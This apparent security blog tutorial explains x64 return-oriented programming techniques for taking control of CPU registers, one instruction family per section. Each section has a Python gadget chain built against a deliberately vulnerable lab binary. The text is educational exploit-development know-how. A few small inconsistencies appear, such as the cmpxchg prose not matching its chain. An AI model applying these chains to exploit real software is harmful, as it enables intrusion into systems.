---
title: "ROP Techniques for Controlling x64 CPU Registers"
headline: "ROP Techniques for Controlling x64 CPU Registers"
thumbnail: /assets/img/20240301/thumbnail.png
---

## Introduction

This piece intends to provide a collection of x64 instructions that may be used to assume control of CPU registers within a ROP context. Techniques are presented in a loosely arranged sequence, advancing from simple methods to more esoteric ones. Sections will include, where appropriate, theoretical explanations behind the techniques, considerations to have when using them, and examples of the methods in practice.

Intel syntax is used wherever assembly instructions are referenced. No extraneous details about the assembly instructions will be provided if they do not have a direct application relating to the topic of this piece. It is assumed that the reader is familiar with ROP attacks and their uses.

## Research Method

Finding instructions suited for our objective involved going through [1], which provided a complete instruction set reference, identifying instructions with potential, and judging if they met our needs from their descriptions and occasionally with small experiments. "Instructions with potential" typically were those which operated on at least two general-purpose registers or manipulated internal memory.

Creating a proof-of-concept involved cloning an existing Buffer Overflow Template [2] and adding custom assembly to the project for ROP gadgets [3]. The advantage this provided was purely convenience; compiler settings regarding security properties were preconfigured. The application was compiled into a PE32+ executable. Exploits were created with pwntools. Debugging was done with WinDbg.

## pop

The ``pop`` instruction loads the value at the top of the stack into its operand [1, p. 1614]. 
  
The following gadget chain uses ``pop`` to place ``0xdeadbeefdeadbeef`` into ``rax``.

| ![pop-chain_stack.PNG](/assets/img/20240301/pop-chain_stack.PNG) |
| :---: |
| **Figure 1:** POP Chain Stack Setup Upon Initial Breakpoint | 

| ![pop-chain_command.PNG](/assets/img/20240301/pop-chain_command.PNG) |
| :---: |
| **Figure 2:** POP Chain Progression and Register Values |

```python
chain = [

    # ropnop for breakpoint purposes
    0x7d6eb3,                   # 0x7d6eb3: ret ;
    
    0x7d2278,                   # 0x7d2278: pop rax ; ret ;
    0xdeadbeefdeadbeef          # target value

]
```

## mov

The ``mov`` instruction moves the value of its second operand into its first [1, p. 1256]. 

The following gadget chain moves the value of ``rbx`` into the ``rax`` register.

| ![mov-chain_stack.PNG](/assets/img/20240301/mov-chain_stack.PNG) |
| :---: |
| **Figure 3:** MOV Chain Stack Setup Upon Initial Breakpoint | 

| ![mov-chain_command.PNG](/assets/img/20240301/mov-chain_command.PNG) |
| :---: |
| **Figure 4:** MOV Chain Progression of Instructions and Register Values |

```python
chain = [

    # ropnop for breakpoint purposes
    0x7d6eb3,                   # 0x7d6eb3: ret ;
    
    0x7d5b22,                   # 0x7d5b22: pop rbx ;
    0xdeadbeefdeadbeef,         # target value
    0x7d5b28                    # 0x7d5b28: mov rax, rbx ;

]
```

## xchg

The ``xchg`` instruction swaps the values of its two operands [1, p. 2714]. 

The following gadget chain exchanges the values of the ``rax`` and ``rbx`` registers.

| ![xchg-chain_stack.PNG](/assets/img/20240301/xchg-chain_stack.PNG) |
| :---: |
| **Figure 5:** XCHG Chain Stack Setup Upon Initial Breakpoint | 

| ![xchg-chain_command.PNG](/assets/img/20240301/xchg-chain_command.PNG) |
| :---: |
| **Figure 6:** XCHG Chain Progression of Instructions and Register Values |

```python
chain = [

    # ropnop for breakpoint purposes
    0x7d6eb3,                   # 0x7d6eb3: ret ;
    
    0x7d5b22,                   # 0x7d5b22: pop rbx ;
    0xdeadbeefdeadbeef,         # target value
    0x7d5b35                    # 0x7d5b35: xchg rax, rbx ; ret ;

]
```

## xadd

The ``xadd`` instruction swaps the values of its two operands and then adds the value of its second operand to its first [1, p. 2709]. This addition operation renders this gadget as only viable for moving the value of its first operands into its second, as the latter will be modified.

The following gadget chain is utilized to move the value of ``rbx`` into ``rax``. Notice the sum of ``rax`` and ``rbx`` moving into ``rbx``.

| ![xadd-chain_stack.PNG](/assets/img/20240301/xadd-chain_stack.PNG) |
| :---: |
| **Figure 7:** XADD Chain Stack Setup Upon Initial Breakpoint | 

| ![xadd-chain_command.PNG](/assets/img/20240301/xadd-chain_command.PNG) |
| :---: |
| **Figure 8:** XADD Chain Progression of Instructions and Register Values |

```python
chain = [

    # ropnop for breakpoint purposes
    0x7d6eb3,                   # 0x7d6eb3: ret ;
    
    0x7d5b22,                   # 0x7d5b22: pop rbx ;
    0xdeadbeefdeadbeef,         # target value
    0x7d5b44                    # 0x7d5b44: xadd rbx, rax ; ret ;

]
```

## or

The ``or`` instruction performs a bitwise OR operation on its two operands and stores the result within its first [1, p. 1389].

It is most useful when transferring an instance of a dynamic register, like a stack pointer, into a controlled register for later use. This is because the destination register (first operand) which gets written to, must already be controllable in order to use ``or`` for a value transfer.

The technique works by setting the destination register to the value ``0x0``, so when a bitwise OR is performed onto it with the source register (second operand), the effect is that the value of the source is mirrored into the destination.

$$s = 1011111011101111, d = 0$$

$$d ∨ s ≡ s$$

$$∴ d = d ∨ s → d ≡ s$$

The following gadget chain uses this method to move the value of ``rbx`` into``rax``.

| ![or-chain_stack.PNG](/assets/img/20240301/or-chain_stack.PNG) |
| :---: |
| **Figure 9:** OR Chain Stack Setup Upon Initial Breakpoint | 

| ![or-chain_command.PNG](/assets/img/20240301/or-chain_command.PNG) |
| :---: |
| **Figure 10:** OR Chain Progression of Instructions and Register Values |

```python
chain = [

    # ropnop for breakpoint purposes
    0x7d6eb3,                   # 0x7d6eb3: ret ;
    
    0x7d5b22,                   # 0x7d5b22: pop rbx ;
    0xdeadbeefdeadbeef,         # target value
    0x7d2278,                   # 0x7d2278: pop rax ;
    0x0,                        # nulls for bitwise or
    
    0x7d5b38                    # 0x7d5b38: or rax, rbx ; ret ;

]
```

## xor

The ``xor`` instruction performs a bitwise XOR operation on its two operands and stores the result within its first [1, p. 2722]. For the objective of value transfers from dynamic registers, it operates identically to ``or`` because $$x ∨ 0 ≡ x ⊕ 0$$. 

  
The following gadget chain applies the same concept as the ``or`` chain to move the value of ``rbx`` into ``rax``.

| ![xor-chain_stack.PNG](/assets/img/20240301/xor-chain_stack.PNG) |
| :---: |
| **Figure 11:** XOR Chain Stack Setup Upon Initial Breakpoint | 

| ![xor-chain_command.PNG](/assets/img/20240301/xor-chain_command.PNG) |
| :---: |
| **Figure 12:** XOR Chain Progression of Instructions and Register Values |

```python
chain = [

    # ropnop for breakpoint purposes
    0x7d6eb3,                   # 0x7d6eb3: ret ;
    
    0x7d5b22,                   # 0x7d5b22: pop rbx ;
    0xdeadbeefdeadbeef,         # target value
    0x7d2278,                   # 0x7d2278: pop rax ;
    0x0,                        # nulls for bitwise or
    
    0x7d5b3c                    # 0x7d5b3c: xor rax, rbx ; ret ;

]
```

## mul

The ``mul`` instruction performs unsigned multiplication on its operand with ``rax`` and stores the result into ``rdx:rax``. This means if the result of the multiplication is ``0xdeaddead00000000beefbeef00000000`` then ``0xdeaddead00000000`` will be placed into ``rdx`` and ``0xbeefbeef00000000``will be placed into ``rax`` [1, p. 1367].

This instruction is most useful for transferring an instance of a dynamic register. Reference the ``or`` section of this piece for more information on this use case.

The technique works by setting ``rax`` to `0x1`. When multiplication is performed onto it with the value of an operand register, the effect is that the operand register value is mirrored into ``rax``.

The following gadget chain uses this method to move the value of ``rbx`` into ``rax``.

| ![mul-chain_stack.PNG](/assets/img/20240301/mul-chain_stack.PNG) |
| :---: |
| **Figure 13:** MUL Chain Stack Setup Upon Initial Breakpoint | 

| ![mul-chain_command.PNG](/assets/img/20240301/mul-chain_command.PNG) |
| :---: |
| **Figure 14:** MUL Chain Progression of Instructions and Register Values |

```python
chain = [

    # ropnop for breakpoint purposes
    0x7d6eb3,                   # 0x7d6eb3: ret ;
    
    0x7d5b22,                   # 0x7d5b22: pop rbx ;
    0xdeadbeefdeadbeef,         # target value
    0x7d2278,                   # 0x7d2278: pop rax ;
    0x1,                        # 0x1 for multiplication
    
    0x7d5b40                    # 0x7d5b40: mul rbx ; ret ;

]
```

## cmovcc

These chains are combinations of 2 concepts. ``cmovcc`` is a family of instructions that perform ``mov`` operations based on a variety of conditions, which are tracked from status flags within ``EFLAGS``. Reference [1, p. 769] for a full list of ``cmovcc`` instructions and their corresponding conditions. Reference [1, p. 437] for a full list of instructions which modify ``EFLAGS``, as well as the information regarding which status flags they modify, and the nature of the modifications.

As each ``cmovcc`` instruction requires a condition, it must be prepared correctly before calling the ``cmovcc`` gadget.

The following gadget chain uses ``cmove`` to move the value of ``rcx`` into ``rax``. The condition of ``cmove`` is that the ``ZF`` flag of the ``EFLAGS`` register must equal ``1``. This condition was satisfied by performing a ``cmp`` instruction on two equal values.

| ![cmp_cmove-chain_stack.PNG](/assets/img/20240301/cmp-cmove-chain_stack.PNG) |
| :---: |
| **Figure 15:** CMP-CMOVE Chain Stack Setup Upon Initial Breakpoint | 

| ![cmp_cmove-chain_command.PNG](/assets/img/20240301/cmp-cmove-chain_command.PNG) |
| :---: |
| **Figure 16:** CMP-CMOVE Chain Progression of Instructions and Register Values |

```python
chain = [

    # ropnop for breakpoint purposes
    0x7d6eb3,                   # 0x7d6eb3: ret ;
    
    0x7d5b22,                   # 0x7d5b22: pop rbx ;
    0xabcdabcdabcdabcd,         # cmp value 1
    0x7d5b24,                   # 0x7d5b24: pop rcx ; ret ;
    0xabcdabcdabcdabcd,         # cmp value 2
    0x7d5b2c,                   # 0x7d5b2c: cmp rcx, rbx ; ret ;
    
    0x7d5b24,                   # 0x7d5b24: pop rcx ; ret ;
    0xdeadbeefdeadbeef,         # target value
    0x7d5b30,                   # 0x7d5b30 : cmove rax, rcx ; ret ;

]
```

## cmpxchg

The ``cmpxchg`` instruction compares its first operand with the value of ``rax``. If they are equal, the value of its second operand is loaded into its first. Otherwise, that value is loaded into ``rax`` [1, p. 802].

The following gadget chain moves the value of ``rcx`` into ``rbx``. It does this by setting the values of ``rax`` and ``rcx`` to be equal before calling the ``cmpxchg`` gadget. If ``rax`` and ``rcx`` were not equal, then the value of ``rcx`` would be moved into ``rax`` instead of ``rbx``. Both setups may provide utility on a case-by-case basis.

| ![cmpxchg-chain_stack.PNG](/assets/img/20240301/cmpxchg-chain_stack.PNG) |
| :---: |
| **Figure 17:** CMPXCHG Chain Stack Setup Upon Initial Breakpoint | 

| ![cmpxchg-chain_command.PNG](/assets/img/20240301/cmpxchg-chain_command.PNG) |
| :---: |
| **Figure 18:** CMPXCHG Chain Progression of Instructions and Register Values |

```python
chain = [

    # ropnop for breakpoint purposes
    0x7d6eb3,                   # 0x7d6eb3: ret ;
    
    0x7d2278,                   # 0x7d2278: pop rax ;
    0xabcdabcdabcdabcd,         # cmp value 1
    0x7d5b22,                   # 0x7d5b22: pop rbx ;
    0xabcdabcdabcdabcd,         # cmp value 2
    
    0x7d5b24,                   # 0x7d5b24: pop rcx ; ret ;
    0xdeadbeefdeadbeef,         # target value
    0x7d5b49,                   # 0x7d5b49: cmpxchg rbx, rcx ; ret ;

]
```

## References 


[1] [Intel® 64 and IA-32 Architectures Software Developer’s Manual Combined Volumes](https://cdrdv2.intel.com/v1/dl/getContent/671200)

[2] [Andy53/BufferOverflowExample](https://github.com/Andy53/BufferOverflowExample)

[3] [ToBeatElite/BufferOverflowExample](https://github.com/ToBeatElite/BufferOverflowExample)
